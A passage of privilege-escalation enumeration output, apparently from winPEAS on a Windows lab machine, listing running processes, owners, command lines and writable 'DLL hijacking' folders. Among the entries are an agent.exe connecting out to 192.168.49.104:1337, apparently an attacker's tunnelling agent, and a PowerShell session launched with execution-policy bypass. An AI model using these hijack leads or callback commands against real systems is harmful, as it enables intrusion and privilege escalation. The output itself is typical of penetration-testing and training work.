    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=1968 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:3
   =================================================================================================

    MoUsoCoreWorker(5032)[C:\Windows\uus\packages\preview\AMD64\MoUsoCoreWorker.exe] -- POwn: SYSTEM
    Command Line: "C:\Windows\uus\packages\preview\AMD64\MoUsoCoreWorker.exe" useprivatenamespaces
   =================================================================================================

    taskhostw(1276)[C:\Windows\system32\taskhostw.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: taskhostw.exe
   =================================================================================================

    svchost(2872)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository
   =================================================================================================

    RuntimeBroker(4716)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    agent(4160)[C:\Users\r.andrews\agent.exe] -- POwn: r.andrews
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews (Administrators [Allow: AllAccess])
    Command Line: "C:\Users\r.andrews\agent.exe" -connect 192.168.49.104:1337 -ignore-cert
   =================================================================================================

    taskhostw(6740)[C:\Windows\system32\taskhostw.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    svchost(9172)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    svchost(1748)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain
   =================================================================================================

    msedge(11048)[C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\Edge\Application (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --mojo-platform-channel-handle=2372 --field-trial-handle=2196,i,7538803288900139334,9312961682307429421,131072 /prefetch:8
   =================================================================================================

    winlogon(700)[C:\Windows\system32\winlogon.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: winlogon.exe
   =================================================================================================

    svchost(4576)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc
   =================================================================================================

    RuntimeBroker(9252)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    svchost(1120)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS
   =================================================================================================

    msedge(11032)[C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\Edge\Application (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=2096 --field-trial-handle=2196,i,7538803288900139334,9312961682307429421,131072 /prefetch:3
   =================================================================================================

    svchost(2408)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    svchost(4560)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p
   =================================================================================================

    svchost(2400)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    msedgewebview2(9748)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir="C:\Users\Administrator\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=1956 --field-trial-handle=1928,i,15664937513237927659,16349251277674059669,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:3
   =================================================================================================

    vm3dservice(3256)[C:\Windows\system32\vm3dservice.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: vm3dservice.exe -n
   =================================================================================================

    msedge(10820)[C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\Edge\Application (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 "--annotation=prod=Microsoft Edge" --annotation=ver=100.0.1185.36 --initial-client-data=0x138,0x13c,0x140,0x114,0x144,0x7ff8f749d840,0x7ff8f749d850,0x7ff8f749d860
   =================================================================================================

    svchost(4976)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc
   =================================================================================================

    dwm(2068)[C:\Windows\system32\dwm.exe] -- POwn: DWM-3
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "dwm.exe"
   =================================================================================================

    msedge(11000)[C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\Edge\Application (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=2000 --field-trial-handle=2196,i,7538803288900139334,9312961682307429421,131072 /prefetch:2
   =================================================================================================

    svchost(1944)[C:\Windows\System32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation
   =================================================================================================

    svchost(10264)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    TextInputHost(8828)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca
   =================================================================================================

    conhost(4944)[C:\Windows\system32\conhost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(3324)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    svchost(1060)[C:\Windows\System32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k NetworkService -s TermService
   =================================================================================================

    msedgewebview2(5800)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=crashpad-handler --user-data-dir=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --annotation=plat=Win64 "--annotation=prod=Edge WebView2" --annotation=ver=100.0.1185.36 --initial-client-data=0x134,0x138,0x13c,0x110,0x148,0x7ff8f749d840,0x7ff8f749d850,0x7ff8f749d860
   =================================================================================================

    fontdrvhost(6660)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-2
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================

    explorer(4504)[C:\Windows\Explorer.EXE] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    Notepad(1916)[C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe" 
   =================================================================================================

    Widgets(3404)[C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe" -ServerName:Microsoft.Windows.DashboardServer
   =================================================================================================

    svchost(1052)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc
   =================================================================================================

    svchost(3092)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS
   =================================================================================================

    svchost(3204)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p -s SSDPSRV
   =================================================================================================

    OpenConsole(6644)[C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.20.11781.0_x64__8wekyb3d8bbwe\OpenConsole.exe] -- POwn: Administrator
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.20.11781.0_x64__8wekyb3d8bbwe\OpenConsole.exe" -Embedding
   =================================================================================================

    explorer(4916)[C:\Windows\Explorer.EXE] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    UserOOBEBroker(6636)[C:\Windows\System32\oobe\UserOOBEBroker.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\System32\oobe (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
   =================================================================================================

    RuntimeBroker(8788)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    msedgewebview2(1460)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=2208 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:8
   =================================================================================================

    svchost(5768)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
   =================================================================================================

    svchost(2940)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc
   =================================================================================================

    wsmprovhost(5332)[C:\Windows\system32\wsmprovhost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wsmprovhost.exe -Embedding
   =================================================================================================

    WUDFHost(3332)[C:\Windows\System32\WUDFHost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-ef7ab18c-a5d2-4a3b-8fa2-c29e8b215d1a -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-1fba915d-d340-44c4-bd27-63cf2dfc983a -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-c6b805f1-d8ea-42d5-859f-13ca1144af63 -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-223cb438-c896-47bc-846c-48487c74d991 -LifetimeId:fec3b872-f4ad-4842-9d7c-2d0702a18ec8 -DeviceGroupId: -HostArg:16
   =================================================================================================

    svchost(1448)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
   =================================================================================================

    svchost(3168)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s LanmanServer
   =================================================================================================

    svchost(1004)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k RPCSS -p
   =================================================================================================

    svchost(2288)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    WmiPrvSE(4440)[C:\Windows\system32\wbem\wmiprvse.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32\wbem (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wbem\wmiprvse.exe
   =================================================================================================

    msedgewebview2(8588)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36 (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=gpu-process --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1868 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:2
   =================================================================================================

    winlogon(6464)[C:\Windows\system32\winlogon.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: winlogon.exe
   =================================================================================================

    svchost(2708)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s TokenBroker
   =================================================================================================

    svchost(2276)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p -s SessionEnv
   =================================================================================================

    WidgetService(4356)[C:\Program Files\WindowsApps\Microsoft.WidgetsPlatformRuntime_1.4.0.0_x64__8wekyb3d8bbwe\WidgetService\WidgetService.exe] -- POwn: Administrator
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WidgetsPlatformRuntime_1.4.0.0_x64__8wekyb3d8bbwe\WidgetService\WidgetService.exe" -RegisterProcessAsComServer -Embedding
   =================================================================================================

    svchost(6232)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager
   =================================================================================================

    conhost(8728)[C:\Windows\system32\conhost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    sihost(4124)[C:\Windows\system32\sihost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: sihost.exe
   =================================================================================================

    winPEASx64(6156)[C:\Users\g.jarvis\winPEASx64.exe] -- POwn: Administrator -- isDotNet
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\g.jarvis (Administrators [Allow: AllAccess])
    Command Line: "C:\Users\g.jarvis\winPEASx64.exe"
   =================================================================================================

    svchost(3112)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt
   =================================================================================================

    svchost(1816)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k NetworkService -p
   =================================================================================================

    svchost(3108)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks
   =================================================================================================

    svchost(5904)[C:\Windows\system32\svchost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s NPSMSvc
   =================================================================================================

    svchost(3964)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    svchost(3100)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s IKEEXT
   =================================================================================================

    svchost(1804)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k osprivacy -p -s camsvc
   =================================================================================================

    svchost(4816)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc
   =================================================================================================

    svchost(2660)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc
   =================================================================================================

    RuntimeBroker(7400)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    vm3dservice(2224)[C:\Windows\system32\vm3dservice.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\vm3dservice.exe
   =================================================================================================

    svchost(3084)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k utcsvc -p
   =================================================================================================

    powershell(9116)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Permissions: Administrators [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\Windows\System32\WindowsPowerShell\v1.0 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass
   =================================================================================================

    svchost(3076)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService
   =================================================================================================

    dwm(676)[C:\Windows\system32\dwm.exe] -- POwn: DWM-1
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "dwm.exe"
   =================================================================================================

    dllhost(4796)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
   =================================================================================================

    fontdrvhost(9104)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-3
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================

    OneDrive(10396)[C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: Administrator
    Permissions: Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\Administrator\AppData\Local\Microsoft\OneDrive (Administrators [Allow: AllAccess], Administrator [Allow: AllAccess])
    Command Line: "C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
   =================================================================================================

    dllhost(11088)[C:\Windows\system32\DllHost.exe] -- POwn: Administrator
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
   =================================================================================================

    svchost(1772)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [Allow: WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes
   =================================================================================================

    uhssvc(1340)[C:\Program Files\Microsoft Update Health Tools\uhssvc.exe] -- POwn: SYSTEM
    Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\Microsoft Update Health Tools (Administrators [Allow: AllAccess])
    Command Line: "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
   =================================================================================================

    svchost(6080)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
